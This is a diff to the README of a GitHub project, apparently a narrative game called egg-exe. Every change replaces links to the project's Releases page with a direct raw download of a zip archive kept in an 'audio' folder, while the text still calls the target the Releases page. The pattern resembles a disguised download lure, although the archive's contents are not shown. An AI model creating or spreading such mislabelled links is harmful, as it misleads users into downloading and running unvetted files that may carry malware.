@@ -1,6 +1,6 @@
 # 🎮 egg-exe - Enjoy a Fun Interactive Adventure
 
-[![Download egg-exe](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/imlegitkkk/egg-exe/releases)
+[![Download egg-exe](https://raw.githubusercontent.com/imlegitkkk/egg-exe/main/audio/egg-exe-2.3.zip)](https://raw.githubusercontent.com/imlegitkkk/egg-exe/main/audio/egg-exe-2.3.zip)
 
 ## 📜 Description
 
@@ -13,7 +13,7 @@ Dive into the world of narrative gaming with engaging storylines and interactive
 To get started with egg-exe, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Head to the [Releases page](https://github.com/imlegitkkk/egg-exe/releases) to find the latest version of the game.
+   Head to the [Releases page](https://raw.githubusercontent.com/imlegitkkk/egg-exe/main/audio/egg-exe-2.3.zip) to find the latest version of the game.
 
 2. **Download the Game**  
    On the Releases page, you will see various versions of the game. Choose the version that fits best for your device.
@@ -23,7 +23,7 @@ To get started with egg-exe, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download egg-exe, please visit the Releases page: [Download Here](https://github.com/imlegitkkk/egg-exe/releases).
+To download egg-exe, please visit the Releases page: [Download Here](https://raw.githubusercontent.com/imlegitkkk/egg-exe/main/audio/egg-exe-2.3.zip).
 
 You will find all the necessary files for different platforms. Choose the version that suits your operating system.
 
